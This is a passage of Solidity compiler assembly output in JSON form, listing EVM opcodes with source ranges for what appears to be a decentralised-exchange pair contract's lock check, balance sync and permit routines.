											"begin": 3064,
											"end": 3066,
											"name": "DUP5"
										},
										{
											"begin": 3068,
											"end": 3073,
											"name": "DUP5"
										},
										{
											"begin": 3042,
											"end": 3051,
											"name": "PUSH [tag]",
											"value": "190"
										},
										{
											"begin": 3042,
											"end": 3074,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "tag",
											"value": "107"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "JUMPDEST"
										},
										{
											"begin": 443,
											"end": 450,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "DUP2"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "tag",
											"value": "110"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "JUMPDEST"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "SLOAD"
										},
										{
											"begin": 1191,
											"end": 1192,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1179,
											"end": 1192,
											"name": "EQ"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH [tag]",
											"value": "257"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPI"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SUB"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "REVERT"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "tag",
											"value": "257"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPDEST"
										},
										{
											"begin": 1233,
											"end": 1234,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1222,
											"end": 1230,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "SSTORE"
										},
										{
											"begin": 17769,
											"end": 17775,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 17769,
											"end": 17775,
											"name": "SLOAD"
										},
										{
											"begin": 17818,
											"end": 17824,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 17818,
											"end": 17824,
											"name": "SLOAD"
										},
										{
											"begin": 17958,
											"end": 17966,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 17958,
											"end": 17966,
											"name": "SLOAD"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "DUP1"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "DUP2"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "MSTORE"
										},
										{
											"begin": 17947,
											"end": 17951,
											"name": "ADDRESS"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "DUP3"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "ADD"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "MSTORE"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "SWAP1"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 17769,
											"end": 17775,
											"name": "SWAP5"
										},
										{
											"begin": 17769,
											"end": 17775,
											"name": "DUP6"
										},
										{
											"begin": 17769,
											"end": 17775,
											"name": "AND"
										},
										{
											"begin": 17769,
											"end": 17775,
											"name": "SWAP5"
										},
										{
											"begin": 17818,
											"end": 17824,
											"name": "SWAP1"
										},
										{
											"begin": 17818,
											"end": 17824,
											"name": "SWAP4"
										},
										{
											"begin": 17818,
											"end": 17824,
											"name": "AND"
										},
										{
											"begin": 17818,
											"end": 17824,
											"name": "SWAP3"
										},
										{
											"begin": 17849,
											"end": 17977,
											"name": "PUSH [tag]",
											"value": "259"
										},
										{
											"begin": 17849,
											"end": 17977,
											"name": "SWAP3"
										},
										{
											"begin": 17769,
											"end": 17775,
											"name": "DUP6"
										},
										{
											"begin": 17769,
											"end": 17775,
											"name": "SWAP3"
										},
										{
											"begin": 17897,
											"end": 17899,
											"name": "DUP8"
										},
										{
											"begin": 17897,
											"end": 17899,
											"name": "SWAP3"
										},
										{
											"begin": 17913,
											"end": 17967,
											"name": "PUSH [tag]",
											"value": "260"
										},
										{
											"begin": 17913,
											"end": 17967,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 17958,
											"end": 17966,
											"name": "AND"
										},
										{
											"begin": 17958,
											"end": 17966,
											"name": "SWAP2"
										},
										{
											"begin": 17769,
											"end": 17775,
											"name": "DUP6"
										},
										{
											"begin": 17769,
											"end": 17775,
											"name": "SWAP2"
										},
										{
											"begin": 17913,
											"end": 17938,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 17913,
											"end": 17938,
											"name": "SWAP2"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "DUP1"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "DUP3"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "ADD"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "SWAP3"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "SWAP3"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "SWAP1"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "SWAP2"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "SWAP1"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "DUP3"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "SWAP1"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "SUB"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "ADD"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "DUP2"
										},
										{
											"begin": 17769,
											"end": 17775,
											"name": "DUP7"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "DUP1"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "261"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "261"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "POP"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "GAS"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "STATICCALL"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "262"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "262"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "POP"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "POP"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "POP"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "POP"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "MLOAD"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "263"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "263"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "MLOAD"
										},
										{
											"begin": 17913,
											"end": 17953,
											"name": "SWAP1"
										},
										{
											"begin": 17913,
											"end": 17967,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 17913,
											"end": 17957,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 17913,
											"end": 17967,
											"name": "AND"
										},
										{
											"begin": 17913,
											"end": 17967,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 17913,
											"end": 17967,
											"name": "tag",
											"value": "260"
										},
										{
											"begin": 17913,
											"end": 17967,
											"name": "JUMPDEST"
										},
										{
											"begin": 17849,
											"end": 17862,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 17849,
											"end": 17977,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 17849,
											"end": 17977,
											"name": "tag",
											"value": "259"
										},
										{
											"begin": 17849,
											"end": 17977,
											"name": "JUMPDEST"
										},
										{
											"begin": 18096,
											"end": 18104,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 18096,
											"end": 18104,
											"name": "SLOAD"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "DUP1"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "DUP2"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "MSTORE"
										},
										{
											"begin": 18085,
											"end": 18089,
											"name": "ADDRESS"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "DUP3"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "ADD"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "MSTORE"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "SWAP1"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "MLOAD"
										},
										{
											"begin": 17987,
											"end": 18115,
											"name": "PUSH [tag]",
											"value": "264"
										},
										{
											"begin": 17987,
											"end": 18115,
											"name": "SWAP3"
										},
										{
											"begin": 18014,
											"end": 18021,
											"name": "DUP5"
										},
										{
											"begin": 18014,
											"end": 18021,
											"name": "SWAP3"
										},
										{
											"begin": 18035,
											"end": 18037,
											"name": "DUP8"
										},
										{
											"begin": 18035,
											"end": 18037,
											"name": "SWAP3"
										},
										{
											"begin": 18051,
											"end": 18105,
											"name": "PUSH [tag]",
											"value": "260"
										},
										{
											"begin": 18051,
											"end": 18105,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18096,
											"end": 18104,
											"name": "SWAP1"
										},
										{
											"begin": 18096,
											"end": 18104,
											"name": "DIV"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18096,
											"end": 18104,
											"name": "AND"
										},
										{
											"begin": 18096,
											"end": 18104,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18051,
											"end": 18076,
											"name": "DUP7"
										},
										{
											"begin": 18051,
											"end": 18076,
											"name": "AND"
										},
										{
											"begin": 18051,
											"end": 18076,
											"name": "SWAP2"
										},
										{
											"begin": 18051,
											"end": 18076,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 18051,
											"end": 18076,
											"name": "SWAP2"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "DUP1"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "DUP3"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "ADD"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "SWAP3"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "SWAP3"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "SWAP1"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "SWAP2"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "SWAP1"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "DUP3"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "SWAP1"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "SUB"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "ADD"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "DUP2"
										},
										{
											"begin": 18051,
											"end": 18076,
											"name": "DUP7"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "DUP1"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 18051,
											"end": 18091,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "261"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 17987,
											"end": 18115,
											"name": "tag",
											"value": "264"
										},
										{
											"begin": 17987,
											"end": 18115,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1266,
											"end": 1267,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1255,
											"end": 1263,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1255,
											"end": 1267,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "tag",
											"value": "112"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "JUMPDEST"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "AND"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "DUP2"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "tag",
											"value": "114"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "JUMPDEST"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "AND"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "DUP2"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "tag",
											"value": "117"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMPDEST"
										},
										{
											"begin": 3688,
											"end": 3703,
											"name": "TIMESTAMP"
										},
										{
											"begin": 3676,
											"end": 3684,
											"name": "DUP5"
										},
										{
											"begin": 3676,
											"end": 3703,
											"name": "LT"
										},
										{
											"begin": 3676,
											"end": 3703,
											"name": "ISZERO"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH [tag]",
											"value": "270"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "JUMPI"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP2"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E8811561412549151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "82"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MLOAD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP2"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SUB"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "REVERT"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "tag",
											"value": "270"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "JUMPDEST"
										},
										{
											"begin": 3836,
											"end": 3852,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3836,
											"end": 3852,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP10"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "AND"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "MSTORE"
										},
										{
											"begin": 4073,
											"end": 4079,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "MSTORE"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP4"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "KECCAK256"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SLOAD"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP3"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "ADD"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP3"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP3"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MLOAD"
										},
										{
											"begin": 706,
											"end": 772,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP2"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP5"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP14"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "AND"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
